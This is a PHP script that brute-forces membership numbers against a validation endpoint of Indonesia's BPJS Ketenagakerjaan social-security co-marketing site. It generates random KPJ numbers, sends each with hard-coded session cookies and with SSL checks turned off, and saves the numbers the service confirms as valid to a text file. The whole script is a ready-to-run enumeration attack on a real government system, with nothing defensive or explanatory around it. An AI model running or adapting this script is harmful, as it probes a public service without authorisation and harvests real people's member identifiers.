<?php
function str($length = 8) {
    return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )),1,$length);
}
function save($filename, $content)
	{
	    $save = fopen($filename, "a");
	    fputs($save, "$content\r\n");
	    fclose($save);
	}
function gas($file, $mode){
if($mode == 1){
   $no = "1".mt_rand(0,9)."0".str(); 
}elseif($mode == 2){
    $no= "1502658".str(4);
}
$str = "Host: comarketing.bpjsketenagakerjaan.go.id
Connection: keep-alive
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
Referer: https://comarketing.bpjsketenagakerjaan.go.id/promo/1177/jd.id.html
Accept-Language: en-US,en;q=0.9
Cookie: XSRF-TOKEN=eyJpdiI6Ik9Ib3I0Sm9LT2RlTitYSHgrMUFEXC9nPT0iLCJ2YWx1ZSI6ImF5Q1NubUVRSjZld3k3NUUxY2NQZmhIbFZoS1d2cjJlWHVrQUNLcVNiWnQ5OE5adFRkSm1SVDhtRTM2bGZiV1VtTU5MWUtnT3dWR3FydFJRXC9nSHkydz09IiwibWFjIjoiNjc5NzU1MGZiZmRmYmU2NzMyZTFhOWYxOWQxZjA1MTYyNDgxYWIyZTU1MjQzZjA0NzhmMmY3OGFkMGIxMDA0OCJ9; laravel_session=eyJpdiI6IjRCT2NhU2Z3QU56QjJIc3FKSjhtelE9PSIsInZhbHVlIjoiYVpCdlYxOU1cLzVLSFIzN0loeEZ6WEJ1eWYzbVQ3bXJOdXUxSHd2cEQzcUFtTG55MnQwbjJJUUVKaHpnYUUzeTVPeVlIRkxiMys0SThkMm52Q0xCZGJ3PT0iLCJtYWMiOiI0MDBjZDdlMWRjYzBhMDhiYTc5OWJmNGMyNmU5NjVmODg4YjBkMTAzMTY1ZGRlZTc3MjQ4M2Y2YTE0ZWE0MDRiIn0%3D; BIGipServerCOMARKETING_PUBLIK.app~COMARKETING_PUBLIK_pool=rd1o00000000000000000000ffffac1c655fo1002";
$header = explode("\n", $str);
$c = curl_init("https://comarketing.bpjsketenagakerjaan.go.id/getValidasiTK_KPJ?KPJ=$no&NIK=&_=".time());
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_HEADER, true);
    curl_setopt($c, CURLOPT_HTTPHEADER, $header);
    $response = curl_exec($c);
    $httpcode = curl_getinfo($c);
    if (!$httpcode)
        return false;
    else {
        $header = substr($response, 0, curl_getinfo($c, CURLINFO_HEADER_SIZE));
        $body   = substr($response, curl_getinfo($c, CURLINFO_HEADER_SIZE));
    }
    if(!preg_match("/DATA DITEMUKAN/", $body)){
        return "MatiTod ".$no;
    }else{
        save($file, $no);
 return "IdupEa! ".$no;   
    }
}
####EDIT HERE####
$jumlah = 500;
$namafile = "bpjscode.txt";
$mode = 1; //mode 1 = random all - mode 2 = random with prefix 1502658
####END OF EDIT AREA####
echo "Run with mode ".$mode.PHP_EOL;
for($i=0; $i<$jumlah; $i++){
    $o = $i+1;
    echo $o.". ".gas($namafile, $mode).PHP_EOL;
}
?>
